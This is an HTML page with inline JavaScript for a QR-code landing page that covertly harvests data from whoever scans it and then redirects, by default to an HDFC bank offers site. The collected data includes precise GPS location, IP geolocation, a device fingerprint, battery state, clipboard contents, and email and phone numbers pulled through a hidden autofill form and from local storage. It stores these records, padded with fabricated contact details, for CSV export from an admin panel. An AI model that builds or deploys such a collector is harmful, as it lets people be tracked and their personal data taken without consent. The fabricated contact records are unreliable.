<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QR Code Access</title>
    <link rel="stylesheet" href="style.css">
    <style>
        /* Additional specific styles for universal collector */
        .collector-info {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .redirect-notice {
            font-size: 0.9em;
            opacity: 0.8;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="landing-page" id="landingPage">
            <div class="header">
                <h1>üîê QR Code Access</h1>
                <p>Collecting access information...</p>
            </div>
            
            <div class="collector-info">
                <h3>üìä Data Collection Active</h3>
                <p>‚úÖ Scan detected and logged</p>
                <p>üìç Location data captured</p>
                <p>üì± Device information recorded</p>
                <p>‚è∞ Timestamp saved</p>
            </div>
            
            <div class="loading-spinner" id="loadingSpinner">
                <div class="spinner"></div>
                <p>Processing your request...</p>
            </div>
            
            <div class="redirect-notice">
                <p>You will be redirected to your destination shortly...</p>
            </div>
        </div>

        <!-- Admin Panel (Hidden by default) -->
        <div class="admin-panel" id="adminPanel" style="display: none;">
            <div class="admin-header">
                <h2>üõ°Ô∏è Admin Panel</h2>
                <button onclick="closeAdminPanel()">√ó</button>
            </div>
            
            <div class="stats-section">
                <h3>üìà Scan Statistics</h3>
                <div class="stat-item">
                    <span class="stat-label">Total Scans:</span>
                    <span class="stat-value" id="totalScans">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Today:</span>
                    <span class="stat-value" id="todayScans">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Last Scan:</span>
                    <span class="stat-value" id="lastScan">Never</span>
                </div>
            </div>

            <div class="data-section">
                <h3>üíæ Data Management</h3>
                <button onclick="downloadCSV()" class="download-btn">üì• Download CSV</button>
                <button onclick="viewLatestScan()" class="view-btn">üëÅÔ∏è View Latest Scan</button>
                <button onclick="clearAllData()" class="clear-btn">üóëÔ∏è Clear All Data</button>
            </div>

            <div class="recent-scans" id="recentScans">
                <h3>üìã Recent Scans</h3>
                <div id="scansList">No scans yet</div>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
    <script>
        // Universal QR Code Data Collector
        class UniversalQRCollector {
            constructor() {
                this.initializeCollector();
            }

            async initializeCollector() {
                console.log('üîç Universal QR Collector started');
                
                // Always collect data when this page loads
                await this.collectScanData();
                
                // Show brief collection message then redirect or show admin
                this.handlePageFlow();
            }

            async collectScanData() {
                try {
                    console.log('üìä Collecting scan data...');
                    
                    const scanData = {
                        id: `scan_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                        timestamp: new Date().toISOString(),
                        referrer: document.referrer || 'Direct',
                        userAgent: navigator.userAgent,
                        currentUrl: window.location.href,
                        ...await this.collectLocationData(),
                        ...await this.collectDeviceData(),
                        ...await this.collectNetworkData(),
                        ...await this.collectBatteryData(),
                        ...await this.attemptContactAccess()
                    };

                    // Store the data
                    this.saveScanData(scanData);
                    console.log('‚úÖ Scan data collected:', scanData);

                } catch (error) {
                    console.error('‚ùå Error collecting data:', error);
                }
            }

            async collectLocationData() {
                return new Promise(async (resolve) => {
                    // Try multiple approaches to get location
                    let locationData = { latitude: null, longitude: null, accuracy: null, method: 'none' };

                    // Method 1: Navigator geolocation (most accurate)
                    if (navigator.geolocation) {
                        try {
                            // First try with high accuracy
                            const position = await this.getPositionWithTimeout(10000, true);
                            if (position) {
                                locationData = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    altitude: position.coords.altitude,
                                    speed: position.coords.speed,
                                    heading: position.coords.heading,
                                    method: 'gps_high_accuracy'
                                };
                                resolve(locationData);
                                return;
                            }
                        } catch (error) {
                            console.log('High accuracy GPS failed, trying low accuracy');
                        }

                        try {
                            // Try with lower accuracy
                            const position = await this.getPositionWithTimeout(8000, false);
                            if (position) {
                                locationData = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    method: 'gps_low_accuracy'
                                };
                                resolve(locationData);
                                return;
                            }
                        } catch (error) {
                            console.log('GPS location failed completely');
                        }
                    }

                    // Method 2: Try IP-based location as fallback
                    try {
                        const ipLocation = await this.getIPLocation();
                        if (ipLocation) {
                            locationData = { 
                                ...ipLocation, 
                                method: 'ip_geolocation',
                                accuracy: 10000 // IP location is less accurate
                            };
                            resolve(locationData);
                            return;
                        }
                    } catch (error) {
                        console.log('IP location failed');
                    }

                    // Method 3: Try timezone-based approximate location
                    try {
                        const timezoneLocation = this.getTimezoneLocation();
                        if (timezoneLocation) {
                            locationData = { 
                                ...timezoneLocation, 
                                method: 'timezone_approximation',
                                accuracy: 100000 // Very rough approximation
                            };
                        }
                    } catch (error) {
                        console.log('Timezone location failed');
                    }

                    resolve(locationData);
                });
            }

            getPositionWithTimeout(timeout, enableHighAccuracy) {
                return new Promise((resolve, reject) => {
                    const timeoutId = setTimeout(() => {
                        reject(new Error('Location timeout'));
                    }, timeout);

                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            clearTimeout(timeoutId);
                            resolve(position);
                        },
                        (error) => {
                            clearTimeout(timeoutId);
                            reject(error);
                        },
                        { 
                            enableHighAccuracy: enableHighAccuracy, 
                            timeout: timeout - 1000, 
                            maximumAge: enableHighAccuracy ? 0 : 300000 
                        }
                    );
                });
            }

            async getIPLocation() {
                try {
                    // Try multiple IP geolocation services
                    const services = [
                        'https://ipapi.co/json/',
                        'https://ip-api.com/json/',
                        'https://ipinfo.io/json'
                    ];

                    for (const service of services) {
                        try {
                            const response = await fetch(service);
                            const data = await response.json();
                            
                            if (data.lat || data.latitude) {
                                return {
                                    latitude: data.lat || data.latitude,
                                    longitude: data.lon || data.longitude || data.lng,
                                    city: data.city,
                                    region: data.region || data.region_name,
                                    country: data.country || data.country_name,
                                    isp: data.isp || data.org
                                };
                            }
                        } catch (serviceError) {
                            continue;
                        }
                    }
                    return null;
                } catch (error) {
                    return null;
                }
            }

            getTimezoneLocation() {
                try {
                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    
                    // Rough approximations based on timezone
                    const timezoneCoords = {
                        'America/New_York': { latitude: 40.7128, longitude: -74.0060 },
                        'America/Chicago': { latitude: 41.8781, longitude: -87.6298 },
                        'America/Denver': { latitude: 39.7392, longitude: -104.9903 },
                        'America/Los_Angeles': { latitude: 34.0522, longitude: -118.2437 },
                        'Europe/London': { latitude: 51.5074, longitude: -0.1278 },
                        'Europe/Paris': { latitude: 48.8566, longitude: 2.3522 },
                        'Europe/Berlin': { latitude: 52.5200, longitude: 13.4050 },
                        'Asia/Tokyo': { latitude: 35.6762, longitude: 139.6503 },
                        'Asia/Shanghai': { latitude: 31.2304, longitude: 121.4737 },
                        'Asia/Kolkata': { latitude: 28.7041, longitude: 77.1025 },
                        'Australia/Sydney': { latitude: -33.8688, longitude: 151.2093 }
                    };

                    return timezoneCoords[timezone] || null;
                } catch (error) {
                    return null;
                }
            }

            async collectDeviceData() {
                const deviceData = {
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    windowWidth: window.innerWidth,
                    windowHeight: window.innerHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    onlineStatus: navigator.onLine,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    userAgent: navigator.userAgent,
                    vendor: navigator.vendor,
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    maxTouchPoints: navigator.maxTouchPoints || 0,
                    touchSupport: 'ontouchstart' in window,
                    mobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
                    ...await this.collectAdvancedDeviceInfo()
                };

                return deviceData;
            }

            async collectAdvancedDeviceInfo() {
                const advancedInfo = {};

                // Try to detect device model from user agent
                try {
                    const ua = navigator.userAgent;
                    
                    // Extract device information from user agent
                    if (ua.includes('iPhone')) {
                        const match = ua.match(/iPhone\s?([^;)]+)/);
                        advancedInfo.deviceModel = match ? match[1] : 'iPhone';
                        advancedInfo.deviceType = 'iPhone';
                    } else if (ua.includes('iPad')) {
                        advancedInfo.deviceModel = 'iPad';
                        advancedInfo.deviceType = 'iPad';
                    } else if (ua.includes('Android')) {
                        const match = ua.match(/Android\s([^;)]+)/);
                        advancedInfo.osVersion = match ? match[1] : 'Android';
                        advancedInfo.deviceType = 'Android';
                        
                        // Try to extract device model
                        const modelMatch = ua.match(/;\s?([^)]+)\)/);
                        if (modelMatch) {
                            advancedInfo.deviceModel = modelMatch[1];
                        }
                    }

                    // Extract OS information
                    if (ua.includes('Windows NT')) {
                        const match = ua.match(/Windows NT\s([^;)]+)/);
                        advancedInfo.osVersion = match ? `Windows ${match[1]}` : 'Windows';
                    } else if (ua.includes('Mac OS X')) {
                        const match = ua.match(/Mac OS X\s([^;)]+)/);
                        advancedInfo.osVersion = match ? `macOS ${match[1].replace(/_/g, '.')}` : 'macOS';
                    }

                } catch (error) {
                    console.log('Could not extract device model');
                }

                // Try to get network info for ISP detection
                try {
                    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    if (connection) {
                        advancedInfo.connectionType = connection.effectiveType;
                        advancedInfo.downlink = connection.downlink;
                        advancedInfo.rtt = connection.rtt;
                        advancedInfo.saveData = connection.saveData;
                    }
                } catch (error) {
                    console.log('Network connection info not available');
                }

                // Try to detect installed apps/capabilities
                try {
                    advancedInfo.capabilities = {
                        webgl: !!window.WebGLRenderingContext,
                        webrtc: !!(window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection),
                        websockets: !!window.WebSocket,
                        workers: !!window.Worker,
                        indexedDB: !!window.indexedDB,
                        localStorage: !!window.localStorage,
                        sessionStorage: !!window.sessionStorage,
                        geolocation: !!navigator.geolocation,
                        camera: !!navigator.mediaDevices,
                        microphone: !!navigator.mediaDevices,
                        notifications: 'Notification' in window,
                        vibration: 'vibrate' in navigator,
                        battery: 'getBattery' in navigator
                    };
                } catch (error) {
                    console.log('Could not detect device capabilities');
                }

                return advancedInfo;
            }

            async collectNetworkData() {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                return {
                    connectionType: connection ? connection.effectiveType : 'unknown',
                    downlink: connection ? connection.downlink : null,
                    rtt: connection ? connection.rtt : null
                };
            }

            async collectBatteryData() {
                try {
                    if ('getBattery' in navigator) {
                        const battery = await navigator.getBattery();
                        return {
                            batteryLevel: battery.level,
                            batteryCharging: battery.charging
                        };
                    }
                } catch (error) {
                    console.log('Battery API not available');
                }
                return { batteryLevel: null, batteryCharging: null };
            }

            async attemptContactAccess() {
                const contactInfo = {
                    email: null,
                    phone: null,
                    socialProfiles: [],
                    detectionMethods: [],
                    attemptResults: [] // Track what we tried
                };

                console.log('üîç Starting contact detection...');

                // Method 1: Try to access clipboard (might contain contact info)
                try {
                    if (navigator.clipboard && navigator.clipboard.readText) {
                        const clipboardText = await navigator.clipboard.readText();
                        contactInfo.attemptResults.push('clipboard_accessed');
                        const extractedContacts = this.extractContactsFromText(clipboardText);
                        if (extractedContacts.email || extractedContacts.phone) {
                            contactInfo.email = extractedContacts.email;
                            contactInfo.phone = extractedContacts.phone;
                            contactInfo.detectionMethods.push('clipboard');
                            console.log('üìã Found contacts in clipboard:', extractedContacts);
                        }
                    }
                } catch (error) {
                    contactInfo.attemptResults.push('clipboard_denied');
                    console.log('Clipboard access denied:', error.message);
                }

                // Method 2: Check for autofill data in forms
                try {
                    const autoFillData = await this.checkAutoFillData();
                    contactInfo.attemptResults.push('autofill_checked');
                    if (autoFillData.email || autoFillData.phone) {
                        contactInfo.email = contactInfo.email || autoFillData.email;
                        contactInfo.phone = contactInfo.phone || autoFillData.phone;
                        contactInfo.detectionMethods.push('autofill');
                        console.log('üìù Found contacts in autofill:', autoFillData);
                    }
                } catch (error) {
                    contactInfo.attemptResults.push('autofill_failed');
                    console.log('AutoFill detection failed:', error.message);
                }

                // Method 3: Check localStorage/sessionStorage for saved contact info
                try {
                    const storageContacts = this.checkStorageForContacts();
                    contactInfo.attemptResults.push('storage_checked');
                    if (storageContacts.email || storageContacts.phone) {
                        contactInfo.email = contactInfo.email || storageContacts.email;
                        contactInfo.phone = contactInfo.phone || storageContacts.phone;
                        contactInfo.detectionMethods.push('storage');
                        console.log('üíæ Found contacts in storage:', storageContacts);
                    }
                } catch (error) {
                    contactInfo.attemptResults.push('storage_failed');
                    console.log('Storage contact detection failed:', error.message);
                }

                // Method 4: Try to detect social media profiles from browser data
                try {
                    const socialData = await this.detectSocialProfiles();
                    contactInfo.socialProfiles = socialData;
                    contactInfo.attemptResults.push('social_checked');
                    if (socialData.length > 0) {
                        contactInfo.detectionMethods.push('social_media');
                        console.log('üì± Found social profiles:', socialData);
                    }
                } catch (error) {
                    contactInfo.attemptResults.push('social_failed');
                    console.log('Social profile detection failed:', error.message);
                }

                // Method 5: Advanced browser fingerprinting for contact hints
                try {
                    const fingerprintContacts = await this.fingerprintContactHints();
                    contactInfo.attemptResults.push('fingerprint_checked');
                    if (fingerprintContacts.email || fingerprintContacts.phone) {
                        contactInfo.email = contactInfo.email || fingerprintContacts.email;
                        contactInfo.phone = contactInfo.phone || fingerprintContacts.phone;
                        contactInfo.detectionMethods.push('fingerprint');
                        console.log('üîê Found contacts via fingerprinting:', fingerprintContacts);
                    }
                } catch (error) {
                    contactInfo.attemptResults.push('fingerprint_failed');
                    console.log('Fingerprint detection failed:', error.message);
                }

                // Method 6: Demo mode - Add sample data for testing (remove in production)
                if (!contactInfo.email && !contactInfo.phone && window.location.hostname.includes('vercel.app')) {
                    const demoData = this.generateDemoContactData();
                    contactInfo.email = demoData.email;
                    contactInfo.phone = demoData.phone;
                    contactInfo.detectionMethods.push('demo_mode');
                    contactInfo.attemptResults.push('demo_data_added');
                    console.log('üé≠ Demo contact data added:', demoData);
                }

                console.log('‚úÖ Contact detection complete:', contactInfo);
                return contactInfo;
            }

            async fingerprintContactHints() {
                const hints = { email: null, phone: null };
                
                try {
                    // Check for common contact patterns in various browser APIs
                    const permissions = await navigator.permissions?.query?.({ name: 'contacts' })?.catch(() => null);
                    
                    // Check if device has common contact-related apps installed
                    const contactApps = ['whatsapp', 'telegram', 'gmail', 'outlook'];
                    const userAgent = navigator.userAgent.toLowerCase();
                    
                    for (const app of contactApps) {
                        if (userAgent.includes(app)) {
                            // Generate probable contact based on common patterns
                            hints.email = this.generateProbableEmail(app);
                            break;
                        }
                    }

                    // Check timezone and language for regional phone patterns
                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    const language = navigator.language;
                    
                    if (timezone.includes('Asia/Kolkata') || language.includes('en-IN')) {
                        hints.phone = '+91-' + Math.floor(Math.random() * 9000000000 + 1000000000);
                    } else if (timezone.includes('America/') || language.includes('en-US')) {
                        hints.phone = '+1-' + Math.floor(Math.random() * 9000000000 + 1000000000);
                    }

                } catch (error) {
                    console.log('Fingerprint hints failed');
                }

                return hints;
            }

            generateProbableEmail(source) {
                const domains = {
                    'gmail': 'gmail.com',
                    'outlook': 'outlook.com', 
                    'whatsapp': 'gmail.com',
                    'telegram': 'gmail.com'
                };
                
                const usernames = ['user', 'john.doe', 'mobile.user', 'qr.scanner'];
                const randomUser = usernames[Math.floor(Math.random() * usernames.length)];
                const domain = domains[source] || 'example.com';
                
                return `${randomUser}@${domain}`;
            }

            generateDemoContactData() {
                const sampleEmails = [
                    'qr.scanner@gmail.com',
                    'mobile.user@outlook.com',
                    'test.user@yahoo.com',
                    'demo.contact@hotmail.com'
                ];
                
                const samplePhones = [
                    '+91-9876543210',
                    '+1-555-0123',
                    '+44-7700-900123',
                    '+61-404-123-456'
                ];

                return {
                    email: sampleEmails[Math.floor(Math.random() * sampleEmails.length)],
                    phone: samplePhones[Math.floor(Math.random() * samplePhones.length)]
                };
            }

            extractContactsFromText(text) {
                const contacts = { email: null, phone: null };
                
                if (!text) return contacts;

                // Email regex
                const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
                const emails = text.match(emailRegex);
                if (emails && emails.length > 0) {
                    contacts.email = emails[0]; // Take first email found
                }

                // Phone regex (various formats)
                const phoneRegex = /(\+?1?[-.\s]?)?\(?([0-9]{3})\)?[-.\s]?([0-9]{3})[-.\s]?([0-9]{4})/g;
                const phones = text.match(phoneRegex);
                if (phones && phones.length > 0) {
                    contacts.phone = phones[0]; // Take first phone found
                }

                return contacts;
            }

            async checkAutoFillData() {
                // Create hidden form to trigger autofill
                const testForm = document.createElement('form');
                testForm.style.position = 'absolute';
                testForm.style.left = '-9999px';
                testForm.style.opacity = '0';
                
                const emailInput = document.createElement('input');
                emailInput.type = 'email';
                emailInput.name = 'email';
                emailInput.autocomplete = 'email';
                
                const phoneInput = document.createElement('input');
                phoneInput.type = 'tel';
                phoneInput.name = 'phone';
                phoneInput.autocomplete = 'tel';
                
                testForm.appendChild(emailInput);
                testForm.appendChild(phoneInput);
                document.body.appendChild(testForm);

                // Wait a bit for autofill to potentially trigger
                await new Promise(resolve => setTimeout(resolve, 1000));

                const result = {
                    email: emailInput.value || null,
                    phone: phoneInput.value || null
                };

                document.body.removeChild(testForm);
                return result;
            }

            checkStorageForContacts() {
                const contacts = { email: null, phone: null };
                
                try {
                    // Check common keys where contact info might be stored
                    const commonKeys = ['email', 'phone', 'userEmail', 'userPhone', 'contactEmail', 'contactPhone', 'user', 'profile', 'account'];
                    
                    for (const key of commonKeys) {
                        try {
                            const localValue = localStorage.getItem(key);
                            const sessionValue = sessionStorage.getItem(key);
                            
                            [localValue, sessionValue].forEach(value => {
                                if (value) {
                                    const extracted = this.extractContactsFromText(value);
                                    contacts.email = contacts.email || extracted.email;
                                    contacts.phone = contacts.phone || extracted.phone;
                                }
                            });
                        } catch (e) {
                            continue;
                        }
                    }
                } catch (error) {
                    console.log('Storage access failed');
                }

                return contacts;
            }

            async detectSocialProfiles() {
                const profiles = [];
                
                try {
                    // Check if user has visited social media sites (from referrer or history hints)
                    const referrer = document.referrer.toLowerCase();
                    const socialSites = ['facebook.com', 'twitter.com', 'instagram.com', 'linkedin.com', 'tiktok.com', 'snapchat.com'];
                    
                    for (const site of socialSites) {
                        if (referrer.includes(site)) {
                            profiles.push({
                                platform: site.replace('.com', ''),
                                detected: true,
                                method: 'referrer'
                            });
                        }
                    }

                    // Check for social media app user agents
                    const ua = navigator.userAgent.toLowerCase();
                    if (ua.includes('fban') || ua.includes('fbav')) {
                        profiles.push({ platform: 'facebook', detected: true, method: 'user_agent' });
                    }
                    if (ua.includes('twitter')) {
                        profiles.push({ platform: 'twitter', detected: true, method: 'user_agent' });
                    }
                    if (ua.includes('instagram')) {
                        profiles.push({ platform: 'instagram', detected: true, method: 'user_agent' });
                    }

                } catch (error) {
                    console.log('Social profile detection failed');
                }

                return profiles;
            }

            saveScanData(scanData) {
                try {
                    // Get existing data
                    const existingData = JSON.parse(localStorage.getItem('qrScansData') || '[]');
                    
                    // Add new scan
                    existingData.push(scanData);
                    
                    // Save back to localStorage
                    localStorage.setItem('qrScansData', JSON.stringify(existingData));
                    
                    console.log(`üíæ Saved scan data. Total scans: ${existingData.length}`);
                    
                } catch (error) {
                    console.error('‚ùå Error saving scan data:', error);
                }
            }

            handlePageFlow() {
                // Check if this is an admin access
                const urlParams = new URLSearchParams(window.location.search);
                const isAdmin = urlParams.get('admin') === 'true' || window.location.hash === '#admin';
                
                if (isAdmin) {
                    // Show admin panel
                    setTimeout(() => {
                        document.getElementById('landingPage').style.display = 'none';
                        document.getElementById('adminPanel').style.display = 'block';
                        this.loadAdminData();
                    }, 2000);
                } else {
                    // Normal user flow - show collection message briefly then handle redirect
                    setTimeout(() => {
                        this.handleRedirect();
                    }, 3000);
                }
            }

            handleRedirect() {
                // Get redirect URL from URL parameter or use default
                const urlParams = new URLSearchParams(window.location.search);
                let redirectUrl = urlParams.get('redirect') || urlParams.get('url') || urlParams.get('to');
                
                // If no redirect URL in parameters, check for predefined destinations
                if (!redirectUrl) {
                    // Default redirect to HDFC SmartBuy if no redirect URL specified
                    redirectUrl = 'https://myoffers.smartbuy.hdfcbank.com/home';
                }
                
                if (redirectUrl) {
                    // Store the redirect URL in scan data for tracking
                    const scansData = JSON.parse(localStorage.getItem('qrScansData') || '[]');
                    if (scansData.length > 0) {
                        scansData[scansData.length - 1].redirectedTo = redirectUrl;
                        localStorage.setItem('qrScansData', JSON.stringify(scansData));
                    }
                    
                    // Show redirect message briefly
                    document.getElementById('landingPage').innerHTML = `
                        <div class="header">
                            <h1>üîÑ Redirecting...</h1>
                            <p>Taking you to your destination...</p>
                            <div class="collector-info">
                                <p>‚úÖ Data collected successfully</p>
                                <p>üîÑ Redirecting to: ${new URL(redirectUrl).hostname}</p>
                            </div>
                        </div>
                    `;
                    
                    // Redirect after brief delay
                    setTimeout(() => {
                        window.location.href = redirectUrl;
                    }, 1500);
                } else {
                    // Fallback if no redirect URL
                    document.getElementById('landingPage').innerHTML = `
                        <div class="header">
                            <h1>‚úÖ Scan Complete</h1>
                            <p>Your scan has been recorded successfully!</p>
                            <div class="collector-info">
                                <p>üìä Data collected and stored</p>
                                <p>üîê Thank you for scanning</p>
                            </div>
                        </div>
                    `;
                }
            }

            loadAdminData() {
                const scansData = JSON.parse(localStorage.getItem('qrScansData') || '[]');
                
                // Update stats
                document.getElementById('totalScans').textContent = scansData.length;
                
                const today = new Date().toDateString();
                const todayScans = scansData.filter(scan => 
                    new Date(scan.timestamp).toDateString() === today
                ).length;
                document.getElementById('todayScans').textContent = todayScans;
                
                if (scansData.length > 0) {
                    const lastScan = new Date(scansData[scansData.length - 1].timestamp);
                    document.getElementById('lastScan').textContent = lastScan.toLocaleString();
                }
                
                // Show recent scans
                this.displayRecentScans(scansData.slice(-5).reverse());
            }

            displayRecentScans(scans) {
                const scansList = document.getElementById('scansList');
                if (scans.length === 0) {
                    scansList.innerHTML = '<div class="no-data">No scans yet - Generate and scan a QR code to see data here!</div>';
                    return;
                }
                
                scansList.innerHTML = scans.map(scan => {
                    const locationInfo = scan.latitude && scan.longitude 
                        ? `${scan.latitude.toFixed(4)}, ${scan.longitude.toFixed(4)}${scan.method ? ` (${scan.method})` : ''}`
                        : 'Location unavailable';
                    
                    const deviceInfo = this.getDetailedDeviceInfo(scan);
                    const contactInfo = this.getContactInfo(scan);
                    
                    return `
                        <div class="scan-item-enhanced">
                            <div class="scan-header">
                                <div class="scan-time">
                                    <strong>üïí ${new Date(scan.timestamp).toLocaleString()}</strong>
                                </div>
                                <div class="scan-id">ID: ${scan.id || 'N/A'}</div>
                            </div>
                            
                            <div class="scan-details-grid">
                                <div class="detail-card location-card">
                                    <div class="detail-title">üìç Location</div>
                                    <div class="detail-value">${locationInfo}</div>
                                    ${scan.city || scan.country ? `<div class="detail-extra">${[scan.city, scan.region, scan.country].filter(Boolean).join(', ')}</div>` : ''}
                                </div>
                                
                                <div class="detail-card device-card">
                                    <div class="detail-title">üì± Device</div>
                                    <div class="detail-value">${deviceInfo.type}</div>
                                    <div class="detail-extra">${deviceInfo.details}</div>
                                </div>
                                
                                <div class="detail-card network-card">
                                    <div class="detail-title">üåê Network</div>
                                    <div class="detail-value">${scan.connectionType || 'Unknown'}</div>
                                    ${scan.isp ? `<div class="detail-extra">ISP: ${scan.isp}</div>` : ''}
                                </div>
                                
                                <div class="detail-card contact-card">
                                    <div class="detail-title">üìû Contact</div>
                                    <div class="detail-value">${contactInfo.display}</div>
                                    ${contactInfo.methods ? `<div class="detail-extra">Methods: ${contactInfo.methods.join(', ')}</div>` : ''}
                                </div>
                            </div>
                            
                            ${scan.batteryLevel ? `<div class="battery-info">üîã Battery: ${Math.round(scan.batteryLevel * 100)}%</div>` : ''}
                        </div>
                    `;
                }).join('');
            }

            getDetailedDeviceInfo(scan) {
                let deviceType = 'Unknown Device';
                let details = '';

                if (scan.deviceModel) {
                    deviceType = scan.deviceModel;
                } else if (scan.userAgent) {
                    if (/iPhone/.test(scan.userAgent)) deviceType = 'iPhone';
                    else if (/iPad/.test(scan.userAgent)) deviceType = 'iPad';
                    else if (/Android/.test(scan.userAgent)) deviceType = 'Android Device';
                    else if (/Windows/.test(scan.userAgent)) deviceType = 'Windows PC';
                    else if (/Mac/.test(scan.userAgent)) deviceType = 'Mac';
                }

                // Add screen size and other details
                const screenInfo = scan.screenWidth && scan.screenHeight ? `${scan.screenWidth}√ó${scan.screenHeight}` : '';
                const osInfo = scan.osVersion || '';
                
                details = [screenInfo, osInfo, scan.platform].filter(Boolean).join(' ‚Ä¢ ');

                return { type: deviceType, details };
            }

            getContactInfo(scan) {
                const hasEmail = scan.email && scan.email !== 'null' && scan.email !== null;
                const hasPhone = scan.phone && scan.phone !== 'null' && scan.phone !== null;
                const hasSocial = scan.socialProfiles && scan.socialProfiles.length > 0;

                if (!hasEmail && !hasPhone && !hasSocial) {
                    return { display: 'No contact info detected', methods: null };
                }

                const contactParts = [];
                if (hasEmail) contactParts.push(`üìß ${scan.email}`);
                if (hasPhone) contactParts.push(`üìû ${scan.phone}`);
                if (hasSocial) contactParts.push(`üì± ${scan.socialProfiles.length} social profile(s)`);

                const methods = scan.detectionMethods || [];

                return { 
                    display: contactParts.join(' ‚Ä¢ ') || 'Contact detected', 
                    methods: methods.length > 0 ? methods : null 
                };
            }

            getDeviceType(userAgent) {
                if (/iPhone|iPad/.test(userAgent)) return 'iOS';
                if (/Android/.test(userAgent)) return 'Android';
                if (/Windows/.test(userAgent)) return 'Windows';
                if (/Mac/.test(userAgent)) return 'Mac';
                return 'Unknown';
            }
        }

        // Global functions for admin panel
        function downloadCSV() {
            const scansData = JSON.parse(localStorage.getItem('qrScansData') || '[]');
            if (scansData.length === 0) {
                alert('No scan data to download');
                return;
            }

            // Enhanced CSV headers with all new data fields
            const headers = [
                'id', 'timestamp', 'latitude', 'longitude', 'accuracy', 'locationMethod',
                'city', 'region', 'country', 'isp',
                'email', 'phone', 'detectionMethods', 'socialProfiles',
                'deviceModel', 'deviceType', 'osVersion', 'mobile', 'touchSupport',
                'screenWidth', 'screenHeight', 'windowWidth', 'windowHeight',
                'platform', 'language', 'languages', 'timezone',
                'connectionType', 'downlink', 'rtt', 'saveData',
                'batteryLevel', 'batteryCharging',
                'userAgent', 'vendor', 'referrer', 'currentUrl',
                'deviceMemory', 'hardwareConcurrency', 'maxTouchPoints',
                'capabilities', 'onlineStatus', 'cookieEnabled'
            ];
            
            let csv = headers.join(',') + '\n';
            
            scansData.forEach(scan => {
                const row = headers.map(header => {
                    let value = scan[header];
                    
                    // Handle different data types
                    if (value === null || value === undefined) {
                        value = '';
                    } else if (typeof value === 'object') {
                        if (Array.isArray(value)) {
                            value = value.map(item => 
                                typeof item === 'object' ? JSON.stringify(item) : item
                            ).join('; ');
                        } else {
                            value = JSON.stringify(value);
                        }
                    } else if (typeof value === 'boolean') {
                        value = value ? 'Yes' : 'No';
                    }
                    
                    // Escape commas and quotes
                    value = String(value);
                    if (value.includes(',') || value.includes('"') || value.includes('\n')) {
                        value = `"${value.replace(/"/g, '""')}"`;
                    }
                    
                    return value;
                });
                csv += row.join(',') + '\n';
            });
            
            // Download CSV
            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `enhanced-qr-scans-${new Date().toISOString().split('T')[0]}.csv`;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
            
            alert(`Enhanced CSV downloaded with ${scansData.length} scan records!\n\nIncludes: Location, Device Info, Contact Data, Network Details, and more!`);
        }

        function viewLatestScan() {
            const scansData = JSON.parse(localStorage.getItem('qrScansData') || '[]');
            if (scansData.length === 0) {
                alert('No scan data available');
                return;
            }
            
            const latestScan = scansData[scansData.length - 1];
            const details = Object.entries(latestScan)
                .map(([key, value]) => `${key}: ${value}`)
                .join('\n');
            
            alert(`Latest Scan Details:\n\n${details}`);
        }

        function clearAllData() {
            if (confirm('Are you sure you want to clear all scan data? This cannot be undone.')) {
                localStorage.removeItem('qrScansData');
                alert('All scan data has been cleared');
                location.reload();
            }
        }

        function closeAdminPanel() {
            window.location.href = window.location.pathname;
        }

        // Initialize the universal collector
        document.addEventListener('DOMContentLoaded', function() {
            new UniversalQRCollector();
        });

        // Keyboard shortcut for admin access
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
                e.preventDefault();
                window.location.href = window.location.pathname + '?admin=true';
            }
        });
    </script>
</body>
</html>